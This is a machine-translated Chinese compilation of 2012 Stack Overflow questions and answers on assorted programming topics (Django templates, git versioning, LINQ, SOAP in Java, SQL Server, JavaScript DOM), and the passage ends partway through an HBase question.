* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-06-27T22:11:18.450

您可以使用 python`webbrowser`模块

```
import webbrowser
webbrowser.open('www.stackoverflow.com')
webbrowser.open_new_tab('www.stackoverflow.com/xxxx') 
```

使用标准字符串方法解析 CSV 文件以获取字符串是微不足道的。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-06-27T22:36:32.260

我相信您应该深入研究 Ruby 的[Win32OLE](http://ruby-doc.org/stdlib-1.9.3/libdoc/win32ole/rdoc/index.html)自动化库。有了它，您可以在 Windows 中完成各种自动化工作。

# django - 在 Django 模板中使用冒号访问 JSON 键

> ID：11235382
> 
> 赞同：1
> 
> 时间：2012-06-27T21:58:52.180
> 
> 标签：django, json, django-templates

我正在尝试`id`在 Django 模板中访问 JSON 格式的字段，但其中有一个冒号。

当我将它包含在模板中时，我收到以下错误：

> “无法解析剩余部分：来自‘result.id.attributes.im:id’的‘:id’”。

我尝试转义名称和冒号但没有成功。

当我使用它的父级时，我已经包含了 JSON 输出，以及 Django 模板。

有什么建议么？

**传递父级时带有 JSON 的 HTML 输出 (result.id.attribute) **

```
1 id: {**u'im:id': u'422689480'**, u'im:bundleId': u'com.google.Gmail'} Name: Gmail - Google, Inc.

2 id: {u'im:id': u'530755375', u'im:bundleId': u'com.kfactormedia.mycalendarfree'} Name: MyCalendar Free - K-Factor Media, LLC.

3 id: {u'im:id': u'518972315', u'im:bundleId': u'com.click2mobile.textGramFree'} Name: Textgram - Texting with Instagram FREE - click2mobile

4 id: {u'im:id': u'521863802', u'im:bundleId': u'com.appmosys.emoji2free'} Name: Emoji 2 Free - 300+ NEW Emoticons and Symbols - Appmosys 
```

**Django 模板**

```
<html>
<body>

{% for result in app_data.entry %}

<h3>

    {{ forloop.counter }}
    Id: {{ result.id.attributes }}
    Name: {{ result.title.label }}

{% endfor %}
</h3>
</body>
</html> 
```

编辑以包括视图：

**看法**

```
def findAppRank(request,AppId=424909112):

URL="http://itunes.apple.com/us/rss/topfreeapplications/limit=300/genre=6007/json"

r=requests.get(URL)

output=r.content
data=json.loads(output)

AppData=data['feed']

t=get_template('myrank.html')

html=t.render(Context({'app_data': AppData, 'app_id': AppId }))

return HttpResponse(html) 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-28T14:51:29.650

您正在寻找[`slice`](https://docs.djangoproject.com/en/dev/ref/templates/builtins/#slice)过滤器。

```
{{ result.id.attributes|slice:"'im:id'" }} 
```

# akka - Akka 2.0 中的 MaximumNumberOfRestartsWithinTimeRangeReached 等效项

> ID：11235388
> 
> 赞同：3
> 
> 时间：2012-06-27T21:59:12.760
> 
> 标签：akka, akka-supervision

在 Akka 1.3.1 中，当达到最大重启限制时，主管会收到一条`MaximumNumberOfRestartsWithinTimeRangeReached`消息。

Akka 2.0 中是否有等价的东西？我可以收到 Terminated 消息，但我希望能够检测到这个特定的错误情况。`MaximumNumberOfRestartsWithinTimeRangeReached`还给了你 lastExceptionCausingRestart，这很有用。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-16T14:43:18.930

这已被主管 Actor 的 SupervisorStrategy() 的更详细定义所取代。

据我了解，这也意味着消息不再作为 onReceive() 中的消息到达

# c++ - 在 Objective-C 中调用 C++ 类和方法

> ID：11235390
> 
> 赞同：1
> 
> 时间：2012-06-27T21:59:28.043
> 
> 标签：c++, objective-c, ios, native-code

我正在开发一个 iOS 应用程序，其中大部分后端已经用 C++ 完成。该界面显然是在 Obj-C 中的，我不确定如何同时使用这两种语言。

基本上，我想`Song`在我的 Objective-C 文件中有一个数据成员，然后对该歌曲数据成员/对象执行这些操作：

```
Song song("Hardcore Beatzzz", "RockzStarsz", 60);
song.setTimeSig(4,4);

Track synthTrack;
synthTrack.setTrackName("sinussynth #1");

Note note3(880, 100, 8, 1, 17);
synthTrack.addNote(note3);

playlist.addTrack(synthTrack); 
```

很明显，这都是 C++，但我将如何在我的 Objective-C 文件中做到这一点？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-06-27T22:03:54.817

创建一个扩展名为 .mm 的文件，编译器会将其视为 Objective-C++ 源代码。这将允许您混合 C++ 和 Objective-C 代码。

基本上，您可以调用 C++ 函数并声明具有 C++ 类类型的变量。

在 .mm 文件中，您应该包含 C++ 代码的 .h 文件，然后在 Objective-C 中使用 C++ 的声明。

一个足够的限制：您不能从 Objective-C 接口继承 C++ 类，反之亦然。

当然，“最好的”部分是需要对 C++ 对象进行手动内存管理（参见 rickster 的评论）。没有自动垃圾收集，因此当您声明指针并分配一些内存时，您必须稍后释放它们。

# git - Git 和增量提交日期/编号/某事

> ID：11235395
> 
> 赞同：3
> 
> 时间：2012-06-27T22:00:11.087
> 
> 标签：git, version-control, build-automation, versioning, nant

我正在尝试使用 NAnt 任务设置构建服务器。我有几个想要构建的 Git 存储库，但是我在结果的版本控制方面遇到了问题。

如何对库 (dll) 进行版本控制，以便每个构建都为每个版本使用一个数字？我知道 Git 没有像 SVN 这样的修订号，而是某种哈希。我想过使用提交日期。我只会在中央服务器上构建主服务器，因此所有提交都会增加（合并日期）。

如果我能得到日期的整数表示，我可以使用它（YYMMDD）。

现在我将使用 NAnt 来做所有很酷的事情 :)，Git 是否提供了一种获取最新提交日期的方法？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-06-27T22:11:11.627

你要

```
git log -1 --pretty=format:%cd HEAD 
```

头部是可选的。如果未指定，则推断。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-06-27T22:11:38.817

这为您提供了最新提交（即 HEAD）的提交时间作为 UNIX 时间戳（自纪元以来的秒数，即 1970 年 1 月 1 日的 00:00:00 UTC），这应该是您想要的：

```
% git show -s --format='format:%ct' HEAD
1334298121 
```

然后，您可以使用 date 将其转换为您提到的 YYMMDD 格式，并添加其他内容：

```
% date -r `git show -s --format='format:%ct' HEAD` +"foobar-%C%y%m%d.zip"
foobar-20120413.zip 
```

（我在前面添加了世纪，`%C`因为这似乎是明智的做法，但您当然可以省略它。and`foobar`只是`.zip`有关如何直接生成文件名的示例。）

您还可以选择其他一些格式，详细信息请参见`git show --help`：

```
% git show -s --format='format:%cd' HEAD
Fri Apr 13 14:22:01 2012 +0800
% git show -s --format='format:%cD' HEAD
Fri, 13 Apr 2012 14:22:01 +0800
% git show -s --format='format:%cr' HEAD
3 months ago
% git show -s --format='format:%ct' HEAD
1334298121
% git show -s --format='format:%ci' HEAD
2012-04-13 14:22:01 +0800 
```

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-06-27T22:21:38.747

我知道这不是您所要求的，但是如果您确实想使用版本号，那么 git-describe 是一个选项。

我用它来为我的库和程序提供版本信息。由于我使用版本格式`X.Y.Z`，因此 git-describe 非常适合我。它还有一个额外的好处，就是还为我提供了最新提交的提交 ID，所以我总是可以准确地知道库/程序在源历史记录中的哪一点被编译。

要使用 git-describe，您必须使用签名标签。创建标签时，我使用`vX.Y`. 然后 git-describe 将使用以下格式附加补丁和提交信息，`vX.Y-Z-gC`其中 X 是主要版本，Y 是次要版本，Z 是补丁级别，C 是 git 提交 ID。

例如，我创建一个提交：

```
$ git tag -s v0.2 -m "Creating release 0.2"
$ git tag
v0.0
v0.1
v0.2
$ git describe --long --abbrev=7
0.2.0.gbb871fd 
```

然后，我可以使用以下命令导出具有补丁级别的版本：

```
GIT_DESCRIBE=`git describe --long --abbrev=7 |sed -e 's/-/./g' -e 's/^v//g'`
GIT_MAJOR=`echo ${GIT_DESCRIBE}  |cut -d. -f1`
GIT_MINOR=`echo ${GIT_DESCRIBE}  |cut -d. -f2`
GIT_PATCH=`echo ${GIT_DESCRIBE}  |cut -d. -f3`
GIT_COMMIT=`echo ${GIT_DESCRIBE} |cut -d. -f4`

echo "${GIT_DESCRIBE}"
0.2.53.g00e0e11

echo "${GIT_MAJOR}.${GIT_MINOR}.${GIT_PATCH}.${GIT_COMMIT}"
0.2.53.g00e0e11 
```

在上面的输出中，自最后一个标签创建以来已经有 53 次提交（已修补），并且`00e0e11`是修订历史中最新提交的部分提交 ID。

一旦我有了解析的版本信息，我就可以创建一个 C 头文件来定义在源代码中使用的版本号：

```
cat << EOF > lib_version.h
#undef MYLIB_VER_MAJOR
#undef MYLIB_VER_MINOR
#undef MYLIB_VER_PATCH
#undef MYLIB_VER_COMMIT
#undef MYLIB_VERSION
#define MYLIB_VER_MAJOR  ${GIT_MAJOR}
#define MYLIB_VER_MINOR  ${GIT_MINOR}
#define MYLIB_VER_PATCH  ${GIT_PATCH}
#define MYLIB_VER_COMMIT "${GIT_COMMIT}"
#define MYLIB_VERSION    "${GIT_DESCRIBE}"
EOF 
```

我使用了与上述类似的技术，使用 autoconf（和朋友）和 Xcode 的外部构建目标（实际上是我所有的 iOS 应用程序的版本控制方式）在包中生成版本信息。

这是实现上述内容的真实示例（带有源代码）：http: [//bindle.github.com/LdapKit/](http://bindle.github.com/LdapKit/)请注意，版本信息出现在文档中，并且每次我重新生成文档时都会更新。

# c# - linq 按条件分组，后跟日期组

> ID：11235397
> 
> 赞同：2
> 
> 时间：2012-06-27T22:00:27.580
> 
> 标签：c#, linq

我正在尝试对一些数据进行分组，但运气不佳。

我有一个数据列表

```
 public class TransactionsViewModel
{
    public string BusinessName { get; set; }
    public string Description { get; set; }
    public int TransactionTypeId { get; set; }
    public string TransactionType { get; set; }

    [Display(Name = "Transaction Amount")]
    public decimal TransactionAmount { get; set; }

    [Display(Name = "Transaction Date")]
    public DateTime TransactionDateTime { get; set; }

} 
```

我想对此进行一些分组，所以我创建了几个类，例如

```
 public class BusinessTransaction
{
    public string Name { get; set; }
    public List<Transaction> Transactions { get; set; }
}

public class Transaction
{
    public decimal TransactionAmount { get; set; }
    public string Description { get; set; }
    public DateTime TransactionDate { get; set; }
    public string TransactionType { get; set; }

} 
```

所以我可以按 BusinessName 分组，这很简单

```
 var data = from c in transactions
                   group c by c.BusinessName
                   into business
                   select new BusinessTransaction()
                              {
                                  Name = business.Key,

                              }; 
```

现在如何按 TransactionDateTime.Date 对交易进行分组？我想向客户端发回一个数据结构，如

```
BusinessName
  28-06-12
     Transaction
     Transaction
   27-06-12
     Transaction
 BusinessName
   28-06-12
      Transaction 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-27T22:02:56.280

我想你想要这样的东西：

```
 var data = from c in transactions
            group c by c.BusinessName
            into business
            select new BusinessTransaction
            {
                Name = business.Key,
                Transactions = business.OrderBy(t => t.TransactionDateTime)
                                       .ToList()
            }; 
```

编辑：这就是您当前`BusinessTransaction`班级可以支持的所有结构。如果您想直接支持分组，则必须在其中添加另一层嵌套。

然而，使用现有的结构，客户总是可以自己分组：

```
foreach (var business in query)
{
    Console.WriteLine(business.Name);
    foreach (var group in business.Transactions
                                  .GroupBy(t => t.TransactionDateTime.Date))
    {
        Console.WriteLine("  {0}", group.Key);
        foreach (var transaction in group)
        {
            Console.WriteLine("    {0}", transaction.Description);
        }
    }
} 
```

# java - 本地机器上的 Java 小程序获得取决于代码路径的 AccessControlExceptions

> ID：11235404
> 
> 赞同：0
> 
> 时间：2012-06-27T22:00:58.967
> 
> 标签：java, windows, security, applet

当我从本地目录 E:/ForSteven/PDBModels/pages/2FFU.html 运行我的 html 页面时，当我将 applet jar 文件与 html 一起放置并说 codebase="" 时，它可以正常工作。

当页面位于 jarfile 的子目录中时，它也可以工作 - 假设代码位于 E:/applet/code 页面位于 E:/applet/code/pages 并且数据位于 E:/applet/code/data - 即 page 和 data 都是 code 和 codebase=".." 的子目录，文件是 ../data/mydata.txt

但是，如果代码在 E:/applet/code 中，则页面在 E:/applet/pages 并且数据在 E:/applet/data 并且 codebase="../code"

然后我得到

## java.security.AccessControlException：访问被拒绝（java.io.FilePermission E:\applet\data\data/mydata.txt 读取）

我在 Windows 7 盒子上，我的小程序标签看起来像这样

```
<applet name="flash" code="JmolApplet" archive="JmolApplet.jar"
    codebase="../code"
    width="500" height="420" align="center" mayscript="true">
 ... 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-27T22:40:00.793

请阅读[小程序可以做什么和不能做什么](http://docs.oracle.com/javase/tutorial/deployment/applet/security.html)

未签名的小程序不能执行以下操作：

*   他们无法访问客户端资源，例如本地文件系统、可执行文件、系统剪贴板和打印机。
*   他们无法连接到任何第三方服务器（除了它源自的服务器之外的任何服务器）或从任何第三方服务器检索资源。
*   他们无法加载本机库。
*   他们无法更改 SecurityManager。
*   他们无法创建 ClassLoader。
*   他们无法读取某些系统属性。有关禁止的系统属性列表，请参阅[系统](http://docs.oracle.com/javase/tutorial/deployment/doingMoreWithRIA/properties.html)属性。

# mysql - 如何在 SQL 中增加文本值

> ID：11235406
> 
> 赞同：0
> 
> 时间：2012-06-27T22:01:02.180
> 
> 标签：mysql

我在 MySQL 中有一个名为帐户的表，在我拥有的帐户内部：电子邮件、名字、姓氏等。我想做的是将所有电子邮件帐户替换为通用值，但每个帐户都包含一个最后增加值。我怎样才能在sql中做到这一点？

例如，joeschmoe@gmail.com 将变为replacedemail1@gmail.com，下一个将从asdf@gmail.com 变为replacedemail2@gmail.com，依此类推。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-27T22:08:33.357

```
SET @seq = 0;
UPDATE users SET email = CONCAT('replacedemail', @seq := @seq + 1, '@gmail.com') 
```

# javascript - 无论移动浏览器上的实际 href 属性如何，getAttribute('href') 总是返回 '#'

> ID：11235408
> 
> 赞同：1
> 
> 时间：2012-06-27T22:01:08.140
> 
> 标签：javascript, android, html, mobile

我有一个锚元素

```
<a href="./LayerFilter.html">Markers</a> 
```

及其事件监听器

```
$('a').on('click', function(e){
    alert($(e.target).attr('href'));
    alert(e.target.getAttribute('href'));
    e.preventDefault();
}); 
```

两者都`./LayerFilter.html`在桌面上返回，但`#`在 android 浏览器上（尝试 2.3 和 3.x）

如果我添加`data-href='./LayerFilter.html'`到锚元素并使用`$(e.target).attr('data-href')`，Android 会突然得到正确的值。

这有什么关系？
有没有办法不必向锚添加新属性而只使用href？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-20T20:20:08.497

显然这是由于 jquery mobile “增强”了
我在 1.1.0 上的页面，升级到 1.1.1 解决了这个问题。

# javascript - 身体没有 getElementById？

> ID：11235409
> 
> 赞同：7
> 
> 时间：2012-06-27T22:01:16.830
> 
> 标签：javascript, dom

这个问题困扰了我很久。对不起，如果这是一个愚蠢的问题。

之前，我知道可以通过类名获取元素

```
document.body.getElementsByClassName("foo"); 
```

而且我太懒了，所以我只是将代码复制并粘贴到另一部分来执行此操作

```
document.body.getElementById("bar"); 
```

不小心发现不行 我测试了它说

> 类型错误：对象 #<HTMLBodyElement> 没有方法“getElementById”

那么为什么它有`getElementsByClassName`和`getElementsByTagName`所有那些类似的方法，但只有没有[`getElementById`](https://developer.mozilla.org/en/DOM/document.getElementById)？

```
typeof document === typeof document.body   //true 
```

它们的类型相同，所以它们应该具有相同的东西。但这里似乎并非如此。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-06-27T22:03:59.697

您可以拥有多个具有相同类名的元素，因此缩小搜索范围以从特定节点开始是有意义的。

id 没有意义，因为它应该是唯一的。

你可以只有一个`id`中的`document`，这为什么`getElementById`是一种方法`document`。

例子：

```
<body>
    <div id="start">
        <span class="a">
    </div>
    <div class="a">
    </div>
</body> 
```

`a`从节点开始搜索类`<div id="start">`将为您提供一个元素，
而如果您从顶部节点文档开始，它将以两个元素结束。

**关于`typeof`比较：**

```
typeof 1 == typeof 2 == "Number" // true
1 !== 2 // true. 
```

`typeof`只检查类型，而不是值，`document`并且`document.body`都是对象，但不同的对象。

```
typeof document === typeof document.body === typeof null === "object" // true
document === document.body // false!!! 
```

如您所见，`null`并且`document`共享相同的类型，但是它们是否具有相同的方法...？**不**

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-06-27T22:04:10.740

Id 对于整个文档是唯一的，因此将它们限定在文档的子节点是没有意义的。

类名不是唯一的，有些用例可以找到类名低于另一个元素的元素。

`body.getElementsByClassName('foo')`将获得具有类名 'foo' 但包含在正文中的元素。

`document.getElementsByClassName('foo')`将获取整个文档中所有类名为 'foo' 的元素，包括`<head>`.

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-06-27T22:05:10.320

`typeof document`并且`typeof document.body`是相同的，因为它们都是`object`. 类型在 JS 中与对象的工作方式并不像您认为的那样工作。所以不，它们不一样，并且没有特别的理由它们必须支持相同的功能集。（即使具有相同原型的对象也不必支持相同的功能集，但这是另一回事。）只需调用`getElementById`它`document`就会工作。

（“医生，医生，当我将手臂举过头顶并以 8 字形快速旋转时很痛！”“是吗？所以把它打掉。”）

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-06-27T22:05:47.127

您的`typeof`示例不是比较它们是相同的东西，而是它们是相同的“类型”，两者都返回`object`：

Firebug 控制台的输出：

```
>>> typeof document
"object"
>>> typeof document.body
"object" 
```

有关更多详细信息，请`typeof`访问：

[https://developer.mozilla.org/en/JavaScript/Reference/Operators/typeof](https://developer.mozilla.org/en/JavaScript/Reference/Operators/typeof)

# entity-framework - 带有实体框架的 WCF 数据服务 - 互操作性问题

> ID：11235410
> 
> 赞同：0
> 
> 时间：2012-06-27T22:01:26.200
> 
> 标签：entity-framework, wcf-data-services, wcf-interoperability

通常，WCF 数据服务是可互操作的还是特定于 Microsoft 的？

这个[ADO.NET 博客链接](http://blogs.msdn.com/b/adonet/archive/2011/03/21/using-wcf-data-services-with-entity-framework-4-1-and-code-first.aspx)很好地展示了如何在 WCF 服务中使用 EF。但它也在那个简单的例子中展示了一个返回类型为: 的方法`IQueryable<Patient>`。这是否破坏了互操作性？

对于这些数据服务与 EF 的互操作性是否有任何特殊处理？在这件事上是否有提示或需要注意的事项？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-28T00:32:48.187

这个[MSDN 概述](http://msdn.microsoft.com/en-us/library/cc668794.aspx)说 WCF 数据服务是可互操作的。我相信返回`IQueryable<>`是为了支持 OData 查询表达式。

我假设您不必做任何特别的事情（除了可能使用[WebHttpBinding 和 WebHttpBehavior](http://msdn.microsoft.com/en-us/magazine/dd315413.aspx#id0070050)公开服务）。

如果您正在评估技术，您可能希望将 ASP.NET MVC4 Web API 作为 WCF 数据服务的替代方案。看看这个[博客](http://www.gavindraper.co.uk/2012/04/28/exposing-odata-endpoints-using-the-asp-net-mvc-web-api/)和这个[论坛帖子](http://forums.asp.net/t/1811945.aspx/1)。

# java - Java 应用程序中的 SOAP 调用

> ID：11235411
> 
> 赞同：0
> 
> 时间：2012-06-27T22:01:34.317
> 
> 标签：java, soap, webservice-client, saaj

我正在尝试将 SOAP 调用集成到我的 Java 应用程序中。我已经在线学习了各种教程，但是当我运行应用程序时，它会给出错误，`sm.saveChanges()`如果该行被注释掉，它会给出错误`sm.writeTo(System.out)`。

下面是代码：

```
//Create a SOAPConnection   
          SOAPConnectionFactory sfc = SOAPConnectionFactory.newInstance();
          SOAPConnection connection = sfc.createConnection();

          MessageFactory mf = MessageFactory.newInstance();
          SOAPMessage sm = mf.createMessage();
          SOAPPart sp = sm.getSOAPPart();
          SOAPEnvelope sv = sp.getEnvelope();

          SOAPHeader sh = sm.getSOAPHeader();
          //SOAPHeaderElement headerElement = sh.addHeaderElement(sv.createName("Signature", "SOAP-SEC", "http://schemas.xmlsoap.org/soap/security/2000-12"));

          SOAPBody sb = sm.getSOAPBody();

          //sh.detachNode();

          MimeHeaders headers = sm.getMimeHeaders();
          headers.addHeader("SOAPAction", "\"\""); 
          //QName bodyName = new QName("http://quoteCompany.com", "GetQuote", "d");
          //QName bodyName = new QName(msisdn, "GetRioInformationsRequest", "ser");
          //QName bodyName = new QName("http://schemas.xmlsoap.org/soap/encoding/", "GetRioInformationsRequest", XMLConstants.DEFAULT_NS_PREFIX);
          QName bodyName = new QName("http://quoteCompany.com/", "GetQuote", "ser");
          //QName bodyName = sv.createQName("http://quoteCompany.com/", "GetQuote", "ser");
          Name  bodyName2 = sv.createName("GetQuote","ser", "http://quoteCompany.com/");
          SOAPBodyElement bodyElement = sb.addBodyElement(bodyName2);
          //QName qn = new QName("aName");
          //Name qn = sv.createName("rioSearchRequest");
          QName qn = new QName("returnCode");

          SOAPElement quotation = bodyElement.addChildElement(qn);
          //quotation.addChildElement(qn2);

          //Name qn2 = sv.createName("msisdn");
          //qn2.
          //quotation.addAttribute(qn2, msisdn);
          //quotation.addTextNode("TextMode");
          quotation.addTextNode(msisdn);

          System.out.println("Saving SOAP message.");
          sm.saveChanges();
          System.out.println("\n Soap Request:\n");
          sm.writeTo(System.out);
          System.out.println("Request Outputted for viewing.");

          //URL endpoint = new URL("http://yourServer.com");
          URL endpoint = new URL("http://127.0.0.1:8088/mockSoapBinding");
          System.out.println("URL entered.");
          SOAPMessage response = connection.call(sm, endpoint);
          System.out.println("Resquest Sent!");
          System.out.println(response.getContentDescription());
          System.out.println("Response obtained!"); 
```

相应的错误是：

```
 XSL-1101: (Fatal Error) DOMSource node as this type not supported.
Jun 27, 2012 4:37:45 PM com.sun.xml.messaging.saaj.soap.MessageImpl saveChanges
SEVERE: SAAJ0539: Unable to get header stream in saveChanges
Jun 27, 2012 4:37:45 PM com.sun.xml.messaging.saaj.soap.MessageImpl saveChanges
SEVERE: SAAJ0540: Error during saving a multipart message
SOAP Call Issue: Error during saving a multipart message
com.sun.xml.messaging.saaj.SOAPExceptionImpl: Error during saving a multipart message
    at com.sun.xml.messaging.saaj.soap.MessageImpl.saveChanges(MessageImpl.java:1209)
    at com.application.package.SOAPCalls.SOAPCall(SOAPCalls.java:66)
    at com.application.package.Main.<init>(Main.java:97)
    at com.application.package.Main.main(Main.java:253)
Caused by: com.sun.xml.messaging.saaj.SOAPExceptionImpl: Unable to get header stream in saveChanges: 
    at com.sun.xml.messaging.saaj.soap.MessageImpl.saveChanges(MessageImpl.java:1179)
    ... 3 more
Caused by: java.io.IOException: XSL-1101: (Fatal Error) DOMSource node as this type not supported.
    at com.sun.xml.messaging.saaj.soap.impl.EnvelopeImpl.output(EnvelopeImpl.java:306)
    at com.sun.xml.messaging.saaj.soap.impl.EnvelopeImpl.output(EnvelopeImpl.java:317)
    at com.sun.xml.messaging.saaj.soap.SOAPPartImpl.getContentAsStream(SOAPPartImpl.java:324)
    at com.sun.xml.messaging.saaj.soap.MessageImpl.getHeaderBytes(MessageImpl.java:1020)
    at com.sun.xml.messaging.saaj.soap.MessageImpl.saveChanges(MessageImpl.java:1171)
    ... 3 more 
```

有什么建议么？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-27T22:08:02.117

您真的不想手动执行此操作。生成一个 Web 服务客户端并使用该客户端。

您可以使用[Apache Axis WSDL2Code](http://axis.apache.org/axis2/java/core/tools/CodegenToolReference.html)。还有其他选项可以生成客户端。例如 Eclipse 有一个[内置的工具](http://px.pats.no/px/Eclipse_tutorial.html)可以做到这一点。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-28T05:50:26.730

同意 Udo Held 等人的观点。只想提一下，如果您真的想在如此低的级别上集成 SOAP 调用，您可以首先使用 Apache Axis 来完成，而不是使用调试和 http 数据包跟踪工具进行一些调查以找出您遗漏的内容。例如，当您尝试使用 XPath 从 SOAP 响应中拉出单个节点而不首先将其绑定到 POJO 对象时，这种方式对于某些特定情况来说是值得的。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-27T14:01:56.340

正如@Udo Held 所提到的，您不想手动构建SOAP 请求。

请参阅此问题的答案：[如何从 SOAP 获得响应？](https://stackoverflow.com/a/12621786/101095)

您可以使用该`wsimport`工具自动生成连接到 SOAP 服务所需的所有代码。

`wsimport`随 JDK 一起提供，因此您已经在系统上安装了它（无需额外下载）并假设 Java 在您的路径上，您可以转到任何终端并键入：

```
wsimport http://www.url.to.wsdl.asmx?wsdl -p com.whateveruwant -Xnocompile -d . -keep 
```

完成此操作后，您将能够非常简单地使用自动生成的代码调用 Web 服务，例如：

```
CustomInterface soap = new CustomEndpoint().getCustomInterface();
System.out.println(soap.getAnswerFromWs("ParamValue")); 
```

# sql-server - 如何在 SQL Server 2008 中自动重新启动已停止的存储过程？

> ID：11235413
> 
> 赞同：0
> 
> 时间：2012-06-27T22:01:39.327
> 
> 标签：sql-server, sql-server-2008, stored-procedures, sqlclr, clrstoredprocedure

我有一个必须不断运行的存储过程。有时，由于目前未知的原因，它会停止。如果发生这种情况，我怎样才能让它自动重启 SP？谷歌搜索没有多大帮助，因为所有结果都是关于重新启动*服务器*，而不是存储过程。谢谢你提供的所有帮助。

这是一个 SQLCLR 存储过程，如果这有什么不同的话。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-27T22:09:18.310

您无法自动重新启动它。这样的功能不存在内置的，因为它不是程序的真正目的。

我会设置一个**SQL Server 代理作业**，它每 N 秒（N = 1 或 15 左右）执行一次，并在需要时重新启动该过程。

**您需要一种方法来检测它是否仍在运行。**你可以通过让存储过程在一个特殊的标记表上持有一个排他锁来做到这一点。检查程序可以从该表中读取`WITH (READPAST)`。如果没有行返回，sproc 仍然持有锁，因此它必须处于活动状态。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-28T02:24:35.870

As long as you've got a Rube Goldberg machine, may as make it more fun.

Re-write the proc as such:

1.  Pop a message off of a service broker queue. "Why" will become evident later.
2.  Put a message in a service broker queue. Doesn't matter what it is.
3.  Whatever the proc does now.

Now, make the stored procedure the activation stored procedure for the queue, set max_queue_readers = 1 and you're off to the races.

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-27T22:04:36.970

编写另一个 sp 来检查第一个是否正在运行，如果没有则启动它。好奇心让我心烦意乱，这东西有什么作用？

# asp.net - 初始化字符串的格式不符合从索引 0 开始的规范不起作用

> ID：11235416
> 
> 赞同：0
> 
> 时间：2012-06-27T22:01:51.010
> 
> 标签：asp.net, sql-server

我已经阅读了有关此问题的所有主题，但没有找到任何问题的答案。我试过不同的连接字符串没有运气？

我尝试了很多东西，但我不知道是什么原因造成的？有没有人遇到过同样的问题并找到了解决方案？

首先是我的堆栈跟踪

**堆栈跟踪：**

```
[ArgumentException: Format of the initialization string does not conform to specification starting at index 0.]
 System.Data.Common.DbConnectionOptions.GetKeyValuePair(String connectionString, Int32 currentPosition, StringBuilder buffer, Boolean useOdbcRules, String& keyname, String& keyvalue) +5081160
 System.Data.Common.DbConnectionOptions.ParseInternal(Hashtable parsetable, String connectionString, Boolean buildChain, Hashtable synonyms, Boolean firstKey) +132
 System.Data.Common.DbConnectionOptions..ctor(String connectionString, Hashtable synonyms, Boolean useOdbcRules) +98
 System.Data.SqlClient.SqlConnectionString..ctor(String connectionString) +64
 System.Data.SqlClient.SqlConnectionFactory.CreateConnectionOptions(String connectionString, DbConnectionOptions previous) +24
 System.Data.ProviderBase.DbConnectionFactory.GetConnectionPoolGroup(String connectionString, DbConnectionPoolGroupOptions poolOptions, DbConnectionOptions& userConnectionOptions) +150
 System.Data.SqlClient.SqlConnection.ConnectionString_Set(String value) +59
 System.Data.SqlClient.SqlConnection.set_ConnectionString(String value) +4
 System.Web.UI.WebControls.SqlDataSource.CreateConnection(String connectionString) +34
 System.Web.UI.WebControls.SqlDataSourceView.ExecuteSelect(DataSourceSelectArguments arguments) +117
 System.Web.UI.DataSourceView.Select(DataSourceSelectArguments arguments, DataSourceViewSelectCallback callback) +21
 System.Web.UI.WebControls.DataBoundControl.PerformSelect() +143
 System.Web.UI.WebControls.BaseDataBoundControl.DataBind() +74
 System.Web.UI.WebControls.GridView.DataBind() +4
 System.Web.UI.WebControls.BaseDataBoundControl.EnsureDataBound() +66
 System.Web.UI.WebControls.CompositeDataBoundControl.CreateChildControls() +75
 System.Web.UI.Control.EnsureChildControls() +102
 System.Web.UI.Control.PreRenderRecursiveInternal() +42
 System.Web.UI.Control.PreRenderRecursiveInternal() +175
 System.Web.UI.Control.PreRenderRecursiveInternal() +175
 System.Web.UI.Page.ProcessRequestMain(Boolean includeStagesBeforeAsyncPoint, Boolean includeStagesAfterAsyncPoint) +2496 
```

**网页配置**

```
 <connectionStrings>
  <add name="riktigaconnstringen" connectionString="Data Source=aspx-XXXXX.mssql.binero.se;Initial Catalog=XXXX-aspx;Persist Security Info=True;User ID=XXXX;Password=XXXXX"/> 
```

**和我的页面**

```
 <asp:SqlDataSource 
        ID="test1" 
        runat="server" 
        DataSourceMode="DataSet"
        SelectCommand="SELECT * FROM t_produkter"
        ConnectionString="<% ConnectionStrings:riktigaconnstringen %>"></asp:SqlDataSource>
 </connectionStrings> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-27T23:29:54.343

我不确定这是否是您的问题的原因，但在 SqlDataSource 的 MSDN 示例中，我可以看到引用 ConnectionString 的不同语法

```
 <asp:SqlDataSource
      ID="test1"   
      runat="server"   
      DataSourceMode="DataSet"  
      SelectCommand="SELECT * FROM t_produkter"  
      ConnectionString="<%$ ConnectionStrings:riktigaconnstringen %>"></asp:SqlDataSource
  </asp:SqlDataSource> 
```

注意`$`后面的字符`<%`

# hbase - /hbase的ConnectionLoss +连接被对等方重置？

> ID：11235418
> 
> 赞同：7
> 
> 时间：2012-06-27T22:02:04.510
> 
> 标签：hbase, apache-zookeeper

我正在本地机器（伪分布式）上运行 Hadoop MapReduce 作业，该作业从 HBase 读取和写入。我间歇性地收到一个中断工作的错误，即使计算机处于单独状态而没有其他重要进程正在运行 - 请参阅下面的日志。作业终止后 ZooKeeper Dump 的输出如下所示，运行失败后客户端数量增加：

```
HBase is rooted at /hbase
Master address: SS-WS-M102:60000
Region server holding ROOT: SS-WS-M102:60020
Region servers:
 SS-WS-M102:60020
Quorum Server Statistics:
 ss-ws-m102:2181
